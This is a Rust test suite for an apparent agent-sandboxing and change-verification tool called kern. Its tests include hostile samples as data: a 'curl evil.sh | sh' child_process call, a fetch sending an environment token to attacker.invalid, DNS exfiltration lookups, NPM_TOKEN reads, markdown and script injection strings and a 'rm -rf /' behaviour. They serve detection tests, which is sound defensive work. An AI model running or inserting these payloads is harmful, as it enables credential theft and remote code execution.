use ed25519_dalek::SigningKey;
use kern::attest::{self, KeySource};
use kern::capability;
use kern::flow::{self, required_checks};
use kern::git::{self, Entry, Files};
use kern::policy::{self, Contract, Operator, attenuate, contract, contract_digest, operator, verifier_digest};
use kern::promote;
use kern::sandbox::{self, Spec};
use kern::util::*;
use serde_json::{Value, json};
use std::path::{Path, PathBuf};
use std::process::Command;

struct Temp(PathBuf);
impl Temp {
    fn new() -> Temp {
        let p = std::env::temp_dir().join(format!("kern-test-{}", uuid4().unwrap()));
        std::fs::create_dir_all(&p).unwrap();
        Temp(p)
    }
    fn join(&self, s: &str) -> PathBuf { self.0.join(s) }
}
impl Drop for Temp {
    fn drop(&mut self) { let _ = std::fs::remove_dir_all(&self.0); }
}
fn sh(dir: &Path, args: &[&str]) -> String {
    let out = Command::new("git").args(args).current_dir(dir).env("GIT_AUTHOR_NAME", "t").env("GIT_AUTHOR_EMAIL", "t@t").env("GIT_COMMITTER_NAME", "t").env("GIT_COMMITTER_EMAIL", "t@t").env("GIT_CONFIG_NOSYSTEM", "1").output().unwrap();
    assert!(out.status.success(), "git {args:?}: {}", String::from_utf8_lossy(&out.stderr));
    String::from_utf8_lossy(&out.stdout).trim().to_string()
}
fn file(text: &str) -> Entry { let b = text.as_bytes().to_vec(); Entry { mode: "100644".into(), oid: git::object_id("blob", &b), size: b.len() as u64, bytes: Some(b) } }
fn files(items: &[(&str, &str)]) -> Files { items.iter().map(|(p, t)| (p.to_string(), file(t))).collect() }
fn policy_value() -> Value {
    json!({ "version": 2, "task": "fix-addition", "filesystem": { "read": ["README.md", "src/", "test/"], "write": ["src/", "test/"] }, "network": [], "secrets": [], "publish": false, "dependencies": null,
        "limits": { "files_changed": 8, "lines_changed": 200, "file_bytes": 65536, "total_bytes": 1048576, "timeout_seconds": 30, "memory_mb": 256, "pids": 64 }, "required_checks": ["addition"] })
}
fn operator_value(executors: &[&str]) -> Value {
    json!({ "version": 3, "repository": "acme/project", "deployment": "single-vm", "executors": executors, "image": format!("sha256:{}", "a".repeat(64)),
        "builders": { "executor": if executors.contains(&"kern-gvisor") { json!("d".repeat(64)) } else { Value::Null }, "verifier": "e".repeat(64) },
        "checks": [{ "id": "addition", "file": std::path::absolute("checks.json").unwrap(), "sha256": "b".repeat(64) }], "registry": "registry.npmjs.org", "permissions": { "test/": ["node:assert"] } })
}

struct Fixture { t: Temp, store: PathBuf, base: String, commit: String, original: Files, candidate: Files, policy: Contract, op: Operator, key: SigningKey, public: String, kern: Value, envelope: Value, run_id: String }
fn kern_payload(policy: &Contract, op: &Operator, run_id: &str, base: &str, commit: &str, manifest: &str, issued: u64) -> Value {
    json!({ "run_id": run_id, "task": policy.task, "repository": op.repository, "base": base, "commit": commit, "manifest_sha256": manifest, "contract_sha256": contract_digest(policy).unwrap(),
        "verifier_sha256": verifier_digest(op).unwrap(), "executor": { "kind": "external", "builder_sha256": null, "source_commit": commit }, "verifier_builder_sha256": op.verifier_builder,
        "deployment": "single-vm", "image": op.image, "runtime": "runsc", "dependencies_sha256": null,
        "checks": required_checks(policy).iter().map(|id| json!({ "id": id, "status": "PASS", "evidence_sha256": "c".repeat(64) })).collect::<Vec<_>>(), "issued_at": issued, "expires_at": issued + 60_000 })
}
fn fixture() -> Fixture {
    let t = Temp::new();
    let store = git::init_store(&t.join("objects.git")).unwrap();
    let original = files(&[("src/add.mjs", "export const add = (a, b) => a - b;\n"), ("README.md", "A fixture\n"), ("test/add.test.mjs", "import assert from 'node:assert';\nimport { add } from '../src/add.mjs';\nassert.equal(add(1, 2), 3);\n")]);
    let base = git::write_commit(&store, &original, None, "fixture").unwrap();
    let mut candidate = original.clone();
    candidate.insert("src/add.mjs".into(), file("export const add = (a, b) => a + b;\n"));
    let policy = contract(&policy_value()).unwrap();
    let op = operator(&operator_value(&["external"])).unwrap();
    let commit = git::write_commit(&store, &candidate, Some(&base), &policy.task).unwrap();
    let manifest = digest(&git::manifest(&store, &commit, 65536, 1048576).unwrap()).unwrap();
    let key = SigningKey::from_bytes(&random_bytes::<32>().unwrap());
    let public = attest::public_pem(&key.verifying_key()).unwrap();
    let run_id = uuid4().unwrap();
    let kern = kern_payload(&policy, &op, &run_id, &base, &commit, &manifest, now_ms() - 1000);
    let envelope = attest::sign(&kern, &KeySource::File(key.clone())).unwrap();
    Fixture { t, store, base, commit, original, candidate, policy, op, key, public, kern, envelope, run_id }
}
fn expected(f: &Fixture) -> Value { json!({ "run_id": f.run_id, "base": f.base, "commit": f.commit, "branch": format!("kern/{}/{}", f.policy.task, f.run_id) }) }
fn denied<T>(r: R<T>, needle: &str) {
    match r { Ok(_) => panic!("expected denial containing {needle:?}"), Err(e) => assert!(e.0.contains(needle), "{:?} does not contain {needle:?}", e.0) }
}

#[test]
fn commits_are_byte_identical_to_git_and_reads_are_exact() {
    let t = Temp::new();
    let repo = t.join("repo");
    std::fs::create_dir_all(repo.join("src/deep/er")).unwrap();
    sh(&t.0, &["init", "-q", "repo"]);
    sh(&repo, &["config", "core.autocrlf", "false"]);
    for (p, c) in [("README.md", "hi\n"), ("src/a.js", "a\n"), ("src/deep/er/b.ts", "b\n"), ("src/a-b.js", "x\n"), ("src/a.b.js", "y\n"), ("logo@2x.png", "\u{1}\u{2}"), ("docs/Über uns.md", "ü\n")] {
        std::fs::create_dir_all(repo.join(p).parent().unwrap()).unwrap();
        std::fs::write(repo.join(p), c).unwrap();
    }
    sh(&repo, &["add", "-A"]);
    sh(&repo, &["commit", "-qm", "base"]);
    let head = sh(&repo, &["rev-parse", "HEAD"]);
    let read = git::read_commit(&repo, &head, 1048576, 16777216).unwrap();
    assert_eq!(read.len(), 7);
    assert_eq!(read["docs/Über uns.md"].bytes.as_deref().unwrap(), "ü\n".as_bytes());
    let mine = git::write_commit(&repo, &read, None, "oracle").unwrap();
    assert_eq!(sh(&repo, &["rev-parse", &format!("{mine}^{{tree}}")]), sh(&repo, &["rev-parse", "HEAD^{tree}"]));
    assert_eq!(git::write_commit(&repo, &read, None, "oracle").unwrap(), mine);
    denied(git::read_commit(&repo, &head, 1048576, 10), "byte limits");
}
#[test]
fn symlinks_submodules_case_collisions_and_reserved_names_are_refused() {
    let t = Temp::new();
    let store = git::init_store(&t.join("s.git")).unwrap();
    for (names, needle) in [(vec!["src/X.js", "src/x.js"], "Case-colliding"), (vec!["a", "a/b"], "collision"), (vec![".git/config"], "Reserved"), (vec!["src/CON.txt"], "Nonportable"), (vec!["a:b"], "Nonportable"), (vec!["a\\b"], "Nonportable")] {
        let fs: Files = names.iter().map(|n| (n.to_string(), file("x"))).collect();
        denied(git::write_commit(&store, &fs, None, "t"), needle);
    }
    let repo = t.join("repo");
    sh(&t.0, &["init", "-q", "repo"]);
    std::fs::write(repo.join("a"), "a").unwrap();
    sh(&repo, &["add", "a"]);
    let blob = sh(&repo, &["hash-object", "-w", "a"]);
    sh(&repo, &["update-index", "--add", "--cacheinfo", &format!("120000,{blob},link")]);
    sh(&repo, &["commit", "-qm", "link"]);
    denied(git::read_commit(&repo, &sh(&repo, &["rev-parse", "HEAD"]), 1048576, 16777216), "Symlinks");
}
#[test]
fn shallow_import_and_bundle_handoff_round_trip_and_reject_tampering() {
    let t = Temp::new();
    let repo = t.join("repo");
    sh(&t.0, &["init", "-q", "repo"]);
    std::fs::create_dir_all(repo.join("src")).unwrap();
    for (i, text) in ["one\n", "two\n"].iter().enumerate() {
        std::fs::write(repo.join("src/a.js"), text).unwrap();
        sh(&repo, &["add", "-A"]);
        sh(&repo, &["commit", "-qm", &format!("c{i}")]);
    }
    let base = sh(&repo, &["rev-parse", "HEAD"]);
    let store = git::import_base(&repo, &base, &t.join("exec.git")).unwrap();
    let mut fs = git::read_commit(&store, &base, 1048576, 16777216).unwrap();
    fs.insert("src/a.js".into(), file("three\n"));
    let commit = git::write_commit(&store, &fs, Some(&base), "t").unwrap();
    let run = json!({ "version": 2, "run_id": uuid4().unwrap(), "repository": "acme/project", "base": base, "commit": commit, "contract_sha256": "a".repeat(64),
        "manifest_sha256": digest(&git::manifest(&store, &commit, 1048576, 16777216).unwrap()).unwrap(), "executor": { "kind": "external", "source_commit": commit }, "dependencies": null });
    git::handoff(&store, &run, &t.join("handoff")).unwrap();
    let verifier = git::init_store(&t.join("independent.git")).unwrap();
    sh(&verifier, &["bundle", "verify", t.join("handoff/artifact.bundle").to_str().unwrap()]);
    let imported = git::import_handoff(&t.join("handoff"), &t.join("verifier")).unwrap();
    assert_eq!(imported["status"], "IMPORTED_UNVERIFIED");
    let mut bad = run.clone();
    bad["manifest_sha256"] = json!("b".repeat(64));
    std::fs::create_dir(t.join("tampered")).unwrap();
    std::fs::copy(t.join("handoff/artifact.bundle"), t.join("tampered/artifact.bundle")).unwrap();
    write_json(t.join("tampered/run.json"), &bad).unwrap();
    denied(git::import_handoff(&t.join("tampered"), &t.join("v2")), "manifest mismatch");
    std::fs::create_dir(t.join("corrupt")).unwrap();
    let mut bytes = std::fs::read(t.join("handoff/artifact.bundle")).unwrap();
    let n = bytes.len();
    bytes[n - 30] ^= 0xff;
    std::fs::write(t.join("corrupt/artifact.bundle"), bytes).unwrap();
    std::fs::copy(t.join("handoff/run.json"), t.join("corrupt/run.json")).unwrap();
    assert!(git::import_handoff(&t.join("corrupt"), &t.join("v3")).is_err());
    let mut swapped = run.clone();
    swapped["base"] = json!(commit);
    swapped["commit"] = json!(base);
    std::fs::create_dir(t.join("swapped")).unwrap();
    std::fs::copy(t.join("handoff/artifact.bundle"), t.join("swapped/artifact.bundle")).unwrap();
    write_json(t.join("swapped/run.json"), &swapped).unwrap();
    denied(git::import_handoff(&t.join("swapped"), &t.join("v4")), "exactly the run base and candidate");
}
#[test]
fn change_gate_enforces_grants_protected_paths_budgets_and_text() {
    let f = fixture();
    assert_eq!(git::changes(&f.original, &f.candidate, &f.policy).unwrap()["lines_upper_bound"], 2);
    for (name, needle) in [("README.md", "outside contract"), ("src/package.json", "Protected"), ("src/.npmrc", "Protected"), ("src/.github/workflows/a.yml", "Protected"), ("src/.env.local", "Protected"), ("src/node_modules/x.js", "Protected")] {
        let mut c = f.candidate.clone();
        c.insert(name.into(), file("x"));
        denied(git::changes(&f.original, &c, &f.policy), needle);
    }
    let mut c = f.candidate.clone();
    c.insert("src/bin.dat".into(), { let b = vec![0u8, 1]; Entry { mode: "100644".into(), oid: git::object_id("blob", &b), size: 2, bytes: Some(b) } });
    denied(git::changes(&f.original, &c, &f.policy), "Binary");
    let mut tight = policy_value();
    tight["limits"]["lines_changed"] = json!(1);
    denied(git::changes(&f.original, &f.candidate, &contract(&tight).unwrap()), "budget");
}
#[test]
fn step_summary_keeps_agent_text_inside_a_code_block() {
    let s = promote::step_summary(&Err(Denied("Patch widens module capabilities: escape:../![x](https://evil.invalid/p.png)\n```\n# Approved by security\n<img src=x>".into())));
    assert!(s.starts_with("### kern-verified: DENIED\n\n"), "{s}");
    for line in s.lines().skip(2).filter(|l| !l.is_empty()) { assert!(line.starts_with("    "), "{line:?} escapes the code block"); }
    let ok = promote::step_summary(&Ok(json!({ "status": "PASS", "head": "```\n# injected" })));
    assert!(ok.starts_with("### kern-verified: PASS\n\n") && ok.lines().skip(2).filter(|l| !l.is_empty()).all(|l| l.starts_with("    ")), "{ok}");
}

#[test]
fn a_closed_output_pipe_is_not_a_crash() {
    for args in [vec!["--help"], vec!["--version"]] {
        let mut child = Command::new(env!("CARGO_BIN_EXE_kern")).args(&args).stdout(std::process::Stdio::piped()).stderr(std::process::Stdio::piped()).spawn().unwrap();
        drop(child.stdout.take());
        let out = child.wait_with_output().unwrap();
        assert!(!String::from_utf8_lossy(&out.stderr).contains("panicked"), "{args:?}: {}", String::from_utf8_lossy(&out.stderr));
    }
}

#[test]
fn behaviour_monitor_records_network_processes_and_environment_reads() {
    let t = Temp::new();
    std::fs::write(t.join("monitor.cjs"), sandbox::MONITOR).unwrap();
    let script = "fetch('http://telemetry.invalid:8080/x').catch(()=>{}); require('net').connect(9, '127.0.0.1').on('error',()=>{}); \
        require('child_process').spawnSync(process.execPath, ['-v']); try { require('child_process').execSync('curl-not-installed --version', { stdio: 'ignore' }); } catch {} \
        process.env.NPM_TOKEN; Object.keys(process.env); process.env.X = '1'; delete process.env.X; setTimeout(() => {}, 300); \
        const dns = require('dns'); dns.resolveTxt('secret.exfil.invalid', () => {}); dns.promises.resolve4('p.exfil.invalid').catch(() => {}); new dns.Resolver().resolveMx('r.exfil.invalid', () => {});";
    let out = Command::new("node").arg("--require").arg(t.join("monitor.cjs")).arg("-e").arg(script).env("KERN_MONITOR", t.join("log")).output().unwrap();
    assert!(out.status.success(), "{}", String::from_utf8_lossy(&out.stderr));
    let log = std::fs::read_to_string(t.join("log")).unwrap();
    for want in ["net:telemetry.invalid:8080", "net:loopback", "exec:node", "exec:curl-not-installed", "env:NPM_TOKEN", "env:*", "dns:secret.exfil.invalid", "dns:p.exfil.invalid", "dns:r.exfil.invalid"] { assert!(log.lines().any(|l| l == want), "missing {want} in:\n{log}"); }
    // the monitor stays silent when it is not asked to record
    let quiet = Command::new("node").arg("--require").arg(t.join("monitor.cjs")).arg("-e").arg("process.env.NPM_TOKEN").output().unwrap();
    assert!(quiet.status.success() && quiet.stdout.is_empty() && quiet.stderr.is_empty());
}

#[test]
fn behaviour_diff_blocks_new_reach_and_contracts_can_allow_it() {
    let set = |items: &[&str]| items.iter().map(|s| s.to_string()).collect::<std::collections::BTreeSet<_>>();
    let base = set(&["exec:sh", "env:NODE_ENV", "net:loopback"]);
    let candidate = set(&["exec:sh", "env:NODE_ENV", "net:loopback", "net:ipc", "env:DEBUG", "env:NPM_TOKEN", "net:telemetry.example:443", "dns:telemetry.example", "exec:curl", "env:*"]);
    let (new, blocking) = flow::behavior_diff(&base, &candidate, &[]);
    assert_eq!(new.len(), 7);
    assert_eq!(blocking, vec!["dns:telemetry.example", "env:*", "env:NPM_TOKEN", "exec:curl", "net:telemetry.example:443"]);
    let (_, blocking) = flow::behavior_diff(&base, &candidate, &["exec:curl".into(), "net:telemetry.example:443".into(), "dns:telemetry.example".into()]);
    assert_eq!(blocking, vec!["env:*", "env:NPM_TOKEN"]);
    // contracts v3 carry the allowlist; it is validated and can only narrow
    let mut v3 = policy_value();
    v3["version"] = json!(3);
    v3["behaviors"] = json!(["net:api.example.com:443", "exec:git"]);
    let c = contract(&v3).unwrap();
    assert_eq!(c.behaviors, vec!["exec:git".to_string(), "net:api.example.com:443".into()]);
    let mut bad = v3.clone();
    bad["behaviors"] = json!(["shell:rm -rf /"]);
    denied(contract(&bad), "behaviors");
    let mut wider = v3.clone();
    wider["behaviors"] = json!(["exec:git", "exec:curl"]);
    denied(attenuate(&v3, &wider), "runtime behavior");
    assert!(required_checks(&c).contains(&"behavior".to_string()));
}

fn control_file(t: &Temp, role: &str) -> PathBuf {
    let git = if cfg!(windows) { PathBuf::from(r"C:\Program Files\Git\cmd\git.exe") } else { PathBuf::from("/usr/bin/git") };
    let pin = json!({ "file": git, "sha256": sha256(std::fs::read(&git).unwrap()) });
    let c = json!({ "version": 1, "role": role, "docker": { "file": pin["file"], "sha256": pin["sha256"], "endpoint": policy::ENDPOINT }, "git": pin, "host_policy": pin,
        "runtime": { "file": "/usr/local/bin/runsc", "sha256": "a".repeat(64), "version": "fixture", "arguments": [] } });
    let path = t.join(&format!("{role}-control.json"));
    std::fs::write(&path, c.to_string()).unwrap();
    path
}
#[test]
fn hosted_verifier_serves_profiles_and_verifies_only_authorised_known_runs() {
    let f = fixture();
    let (private, public) = attest::keypair().unwrap();
    let svc = f.t.join("svc");
    std::fs::create_dir_all(svc.join("tasks")).unwrap();
    std::fs::write(svc.join("operator.json"), operator_value(&["external"]).to_string()).unwrap();
    std::fs::write(svc.join("tasks/fix-addition.json"), policy_value().to_string()).unwrap();
    std::fs::write(svc.join("signer.pem"), &private).unwrap();
    let profile = kern::init::profile(&operator_value(&["external"]), &public).unwrap();
    std::fs::write(svc.join("profile.json"), profile.to_string()).unwrap();
    let token = "t0k3n-for-acme";
    std::fs::write(svc.join("serve.json"), json!({ "version": 1, "listen": "127.0.0.1:0", "signer": "signer.pem", "profile": "profile.json", "work": "work",
        "repositories": { "acme/project": { "operator": "operator.json", "tasks": "tasks", "token_sha256": [sha256(token)] } } }).to_string()).unwrap();
    struct Killed(std::process::Child);
    impl Drop for Killed { fn drop(&mut self) { let _ = self.0.kill(); let _ = self.0.wait(); } }
    let mut server = Killed(Command::new(env!("CARGO_BIN_EXE_kern")).arg("--control").arg(control_file(&f.t, "verifier")).arg("serve").arg(svc.join("serve.json"))
        .stdout(std::process::Stdio::piped()).stderr(std::process::Stdio::null()).spawn().unwrap());
    let mut line = String::new();
    std::io::BufRead::read_line(&mut std::io::BufReader::new(server.0.stdout.take().unwrap()), &mut line).unwrap();
    let url = format!("http://{}", serde_json::from_str::<Value>(&line).unwrap()["address"].as_str().unwrap());
    let agent: ureq::Agent = ureq::Agent::config_builder().http_status_as_error(false).build().into();
    let get = |p: &str| { let mut r = agent.get(&format!("{url}{p}")).call().unwrap(); (r.status().as_u16(), serde_json::from_str::<Value>(&r.body_mut().read_to_string().unwrap()).unwrap()) };
    let post = |tok: &str, body: &Value| { let mut r = agent.post(&format!("{url}/v1/verify")).header("Authorization", &format!("Bearer {tok}")).send(body.to_string()).unwrap(); (r.status().as_u16(), serde_json::from_str::<Value>(&r.body_mut().read_to_string().unwrap()).unwrap()) };
    assert_eq!(get("/healthz").0, 200);
    assert_eq!(get("/v1/profile").1, profile);
    assert_eq!(kern::init::load_profile(&url).unwrap(), profile, "kern init can read the profile from the service");
    let run = json!({ "version": 2, "run_id": uuid4().unwrap(), "repository": "acme/project", "base": f.base, "commit": f.commit, "contract_sha256": contract_digest(&f.policy).unwrap(),
        "manifest_sha256": digest(&git::manifest(&f.store, &f.commit, 65536, 1048576).unwrap()).unwrap(), "executor": { "kind": "external", "source_commit": f.commit }, "dependencies": null });
    git::handoff(&f.store, &run, &f.t.join("handoff")).unwrap();
    let body = json!({ "run": run, "bundle": b64(&std::fs::read(f.t.join("handoff/artifact.bundle")).unwrap()) });
    assert_eq!(post("wrong", &body).0, 401);
    // an unauthenticated client cannot make the service read or reserve a body
    let mut raw = std::net::TcpStream::connect(url.trim_start_matches("http://")).unwrap();
    raw.set_read_timeout(Some(std::time::Duration::from_secs(5))).unwrap();
    std::io::Write::write_all(&mut raw, b"POST /v1/verify HTTP/1.1\r\nHost: x\r\nContent-Length: 100000000\r\n\r\n").unwrap();
    let mut reply = String::new();
    let _ = std::io::Read::read_to_string(&mut raw, &mut reply);
    assert!(reply.starts_with("HTTP/1.1 401"), "{reply:?}");
    let mut other = body.clone();
    other["run"]["repository"] = json!("evil/project");
    let (code, r) = post(token, &other);
    assert!(code == 422 && r["reason"].as_str().unwrap().contains("does not serve"), "{r}");
    let mut stale = body.clone();
    stale["run"]["contract_sha256"] = json!("c".repeat(64));
    assert!(post(token, &stale).1["reason"].as_str().unwrap().contains("No trusted task contract"));
    // a valid request is imported and matched to the trusted contract; this machine then has no gVisor to verify with
    let (code, r) = post(token, &body);
    assert!(code == 422 && r["reason"].as_str().unwrap().contains("Verifier builder identity"), "{r}");
    #[cfg(windows)]
    {
        // kern run hands its boxed result to the same service and reports the service's verdict
        std::fs::write(f.t.join("task.json"), policy_value().to_string()).unwrap();
        std::fs::write(f.t.join("token.txt"), format!("{token}\n")).unwrap();
        std::fs::create_dir_all(f.t.join("keys")).unwrap();
        std::fs::write(f.t.join("keys/verifier.pub"), &public).unwrap();
        let ps = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe";
        let job = json!({ "version": 1, "repo": win(&f.store), "base": f.base, "contract": "./task.json", "tools": [], "network": false, "output": win(&f.t.join("runs")), "promote": false,
            "command": [ps, "-NoProfile", "-NonInteractive", "-Command", "[IO.File]::WriteAllText('src\\add.mjs', \"export const add = (a, b) => a + b;`n\")"],
            "verifier": { "url": url, "token_file": "./token.txt", "public_key": "./keys/verifier.pub", "operator": "./svc/operator.json" } });
        std::fs::write(f.t.join("run.json"), job.to_string()).unwrap();
        let r = kern::local::local_run(&kern::local::run_job(&f.t.join("run.json")).unwrap()).unwrap();
        assert_eq!(r["status"], "BLOCKED", "{r}");
        assert!(r["reason"].as_str().unwrap().contains("Verifier builder identity"), "{r}");
    }
}

#[test]
fn init_sets_up_a_repository_from_a_verifier_profile_in_one_command() {
    let t = Temp::new();
    let repo = t.join("widget");
    sh(&t.0, &["init", "-q", "widget"]);
    sh(&repo, &["remote", "add", "origin", "https://github.com/acme/widget.git"]);
    for (p, c) in [("src/add.js", "module.exports = (a, b) => a + b;\n"), ("test/add.test.js", "require('node:assert');\n"), ("index.js", "module.exports = require('./src/add');\n"),
        ("jest.config.js", "module.exports = {};\n"), ("README.md", "# widget\n"), ("package.json", "{}\n"), ("package-lock.json", "{\"lockfileVersion\":3,\"packages\":{}}\n")] {
        std::fs::create_dir_all(repo.join(p).parent().unwrap()).unwrap();
        std::fs::write(repo.join(p), c).unwrap();
    }
    sh(&repo, &["add", "-A"]);
    sh(&repo, &["commit", "-qm", "base"]);
    let public = attest::keypair().unwrap().1;
    std::fs::write(t.join("operator.json"), operator_value(&["external"]).to_string()).unwrap();
    std::fs::write(t.join("verifier.pub"), &public).unwrap();
    let profile = kern::init::profile(&read_json(t.join("operator.json")).unwrap(), &public).unwrap();
    std::fs::write(t.join("profile.json"), profile.to_string()).unwrap();
    let r = kern::init::init(&repo, &kern::init::load_profile(t.join("profile.json").to_str().unwrap()).unwrap(), "agent", "acme/kern@0123456789abcdef0123456789abcdef01234567").unwrap();
    assert_eq!(r["status"], "INITIALIZED", "{r}");
    let c = contract(&read_json(repo.join(".github/kern/tasks/agent.json")).unwrap()).unwrap();
    assert_eq!((c.read.clone(), c.write.clone()), (vec!["README.md".to_string(), "index.js".into(), "src/".into(), "test/".into()], vec!["index.js".to_string(), "src/".into(), "test/".into()]));
    assert!(c.dependencies && c.checks == vec!["addition".to_string()]);
    let op = operator(&read_json(repo.join(".github/kern/operator.json")).unwrap()).unwrap();
    assert_eq!(op.repository, "acme/widget");
    assert_eq!(std::fs::read_to_string(repo.join(".github/kern/verifier.pub")).unwrap(), public);
    let workflow = std::fs::read_to_string(repo.join(".github/workflows/kern-verified.yml")).unwrap();
    assert!(workflow.contains("uses: acme/kern@0123456789abcdef0123456789abcdef01234567") && workflow.contains("pull_request_target"));
    let ruleset = read_json(repo.join(".github/kern/ruleset.json")).unwrap();
    assert_eq!(ruleset["rules"][0]["parameters"]["required_status_checks"][0], json!({ "context": "kern-verified", "integration_id": 15368 }));
    // never overwrites an existing setup
    denied(kern::init::init(&repo, &profile, "agent", "acme/kern@0123456789abcdef0123456789abcdef01234567"), "already");
    // the CLI accepts repository paths relative to the working directory
    std::fs::remove_dir_all(repo.join(".github")).unwrap();
    let out = Command::new(env!("CARGO_BIN_EXE_kern")).current_dir(&t.0).args(["init", "widget", "profile.json", "acme/kern@0123456789abcdef0123456789abcdef01234567", "second"]).output().unwrap();
    assert!(out.status.success(), "{}", String::from_utf8_lossy(&out.stderr));
}

#[test]
fn audit_log_chains_every_decision_and_the_report_escapes_agent_text() {
    let t = Temp::new();
    let log = t.join("audit.jsonl");
    kern::audit::append(&log, &json!({ "command": "run", "status": "VERIFIED", "task": "fix-addition", "commit": "a".repeat(40) })).unwrap();
    kern::audit::append(&log, &json!({ "command": "check-pr", "status": "DENIED", "reason": "Patch widens module capabilities: src/<script>alert(1)</script>.js +[global:fetch]" })).unwrap();
    let out = Command::new(env!("CARGO_BIN_EXE_kern")).args(["gate-artifact", "x", "y", "z", "w"]).env("KERN_AUDIT_LOG", &log).output().unwrap();
    assert!(!out.status.success());
    let intact = kern::audit::verify(&log).unwrap();
    assert_eq!(intact["entries"], 3);
    let last: Value = serde_json::from_str(std::fs::read_to_string(&log).unwrap().lines().last().unwrap()).unwrap();
    assert_eq!((last["event"]["command"].as_str(), last["event"]["status"].as_str()), (Some("gate-artifact"), Some("DENIED")));
    let html = kern::audit::report(&log).unwrap();
    assert!(html.contains("&lt;script&gt;") && !html.contains("<script>alert"), "agent-controlled text must be escaped");
    assert!(html.contains("Patch widens module capabilities") && html.contains("fix-addition"));
    // editing an earlier decision breaks the chain at the next entry
    let text = std::fs::read_to_string(&log).unwrap();
    std::fs::write(&log, text.replacen("VERIFIED", "BLOCKED", 1)).unwrap();
    denied(kern::audit::verify(&log), "line 2");
}

#[test]
fn block_messages_say_why_and_how_to_allow() {
    let f = fixture();
    let mut c = f.candidate.clone();
    c.insert("README.md".into(), file("x"));
    denied(git::changes(&f.original, &c, &f.policy), "add \"README.md\" to filesystem.read and filesystem.write");
    let mut tight = policy_value();
    tight["limits"]["lines_changed"] = json!(1);
    denied(git::changes(&f.original, &f.candidate, &contract(&tight).unwrap()), "1 file and up to 2 lines changed; the contract allows 8 files and 1 lines");
    let mut c = f.candidate.clone();
    c.insert("src/run.js".into(), file("require('child_process').exec('id');\n"));
    c.insert("index.js".into(), file("fetch('https://x.invalid');\n"));
    let mut wide = policy_value();
    wide["filesystem"] = json!({ "read": ["README.md", "index.js", "src/", "test/"], "write": ["index.js", "src/", "test/"] });
    let changed = git::changes(&f.original, &c, &contract(&wide).unwrap()).unwrap();
    denied(capability::check(&f.original, &c, &changed, &std::collections::BTreeMap::new()), r#"allow it in operator.json: "permissions": {"index.js":["global:fetch"],"src/":["node:child_process"]}"#);
}

#[test]
fn contracts_parse_strictly_and_only_attenuate() {
    let p = policy_value();
    contract(&p).unwrap();
    for (mutate, needle) in [
        (Box::new(|v: &mut Value| v["network"] = json!(["0.0.0.0/0"])) as Box<dyn Fn(&mut Value)>, "no network"), (Box::new(|v: &mut Value| v["secrets"] = json!(["AWS"])), "no secrets"),
        (Box::new(|v: &mut Value| v["publish"] = json!(true)), "publication"), (Box::new(|v: &mut Value| v["extra"] = json!(1)), "unknown"),
        (Box::new(|v: &mut Value| v["filesystem"]["write"] = json!(["lib/"])), "requires read"), (Box::new(|v: &mut Value| v["filesystem"]["read"] = json!(["../etc", "src/", "test/"])), "Nonportable"),
        (Box::new(|v: &mut Value| v["filesystem"]["read"] = json!(["node_modules/", "src/", "test/"])), "not grantable"), (Box::new(|v: &mut Value| v["limits"]["memory_mb"] = json!(999999)), "memory_mb"),
        (Box::new(|v: &mut Value| v["dependencies"] = json!({ "manager": "pip", "lockfile": "x" })), "npm"),
    ] {
        let mut v = p.clone();
        mutate(&mut v);
        denied(contract(&v), needle);
    }
    let mut wider = p.clone();
    wider["filesystem"]["write"] = json!(["src/", "test/", "README.md/"]);
    assert!(attenuate(&p, &wider).is_err());
    let mut fewer = p.clone();
    fewer["required_checks"] = json!(["other"]);
    denied(attenuate(&p, &fewer), "remove a required check");
    let mut deps = p.clone();
    deps["dependencies"] = json!({ "manager": "npm", "lockfile": "package-lock.json" });
    denied(attenuate(&p, &deps), "dependency");
    let mut narrower = p.clone();
    narrower["filesystem"]["write"] = json!(["src/"]);
    narrower["limits"]["timeout_seconds"] = json!(10);
    assert_eq!(attenuate(&p, &narrower).unwrap().write, vec!["src/".to_string()]);
}
#[test]
fn operators_bind_deployment_executors_and_builders() {
    operator(&operator_value(&["external"])).unwrap();
    operator(&operator_value(&["external", "kern-gvisor"])).unwrap();
    let mut v = operator_value(&["kern-gvisor"]);
    v["builders"]["executor"] = Value::Null;
    denied(operator(&v), "executor builder");
    let mut v = operator_value(&["external"]);
    v["deployment"] = json!("laptop");
    denied(operator(&v), "single-vm or multi-machine");
    let mut v = operator_value(&["external"]);
    v["permissions"] = json!({ "src/": ["root:everything"] });
    denied(operator(&v), "Invalid capability");
    let mut v = operator_value(&["external"]);
    v["checks"][0]["id"] = json!("capabilities");
    denied(operator(&v), "reserved");
}

fn caps(name: &str, code: &str) -> Vec<String> { capability::footprint(name, code).unwrap().into_iter().collect() }
#[test]
fn capability_footprint_reads_js_ts_and_jsx_semantically() {
    assert_eq!(caps("src/a.ts", "import type { X } from 'secret-types';\nimport { readFileSync } from 'node:fs';\nexport type Y = typeof fetch;\nconst o = { fetch: 1, eval: 2 };\no.fetch;"), vec!["node:fs"]);
    assert_eq!(caps("src/a.tsx", "import React from 'react';\nexport const A = () => <div>{process.env.HOME}</div>;"), vec!["package:react", "process:env"]);
    assert_eq!(caps("src/a.cjs", "const fs = require('fs/promises');\nconst x = require('./x');\nconst y = require('../');"), vec!["node:fs"]);
    assert_eq!(caps("test/a.js", "const koa = require('..');"), Vec::<String>::new());
    assert_eq!(caps("a.js", "require('../../etc/passwd')"), vec!["escape:../../etc/passwd"]);
    assert_eq!(caps("src/a.mjs", "import './%2e%2e/%2e%2e/x.mjs';"), vec!["escape:./%2e%2e/%2e%2e/x.mjs"]);
    assert_eq!(caps("src/a.mts", "import x = require('lodash/fp');\nexport * from '@scope/pkg/deep';"), vec!["package:@scope/pkg", "package:lodash"]);
    let attacks = [
        ("const r = require; r('child_process').execSync('curl evil.sh | sh');", "require:dynamic"), ("(0, eval)(\"require('child_process')\");", "code:eval"),
        ("globalThis['ev' + 'al']('1');", "global:computed"), ("[].constructor.constructor('return process')();", "code:constructor"),
        ("module.require('child_process');", "module:require"), ("process.getBuiltinModule('child_process');", "process:getBuiltinModule"),
        ("Reflect.construct(Function, ['return 1'])();", "code:Function"), ("setTimeout('console.log(process.env)', 0);", "timer:string"),
        ("fetch('https://attacker.invalid/' + process.env.TOKEN);", "global:fetch"), ("import(`./${name}`);", "import:computed"),
        ("globalThis.eval('1');", "code:eval"), ("new WebSocket('wss://x');", "global:WebSocket"),
    ];
    for (code, cap) in attacks { assert!(caps("src/a.js", code).contains(&cap.to_string()), "{code} missing {cap}"); }
    assert!(capability::footprint("src/a.js", "const = broken").is_err());
}
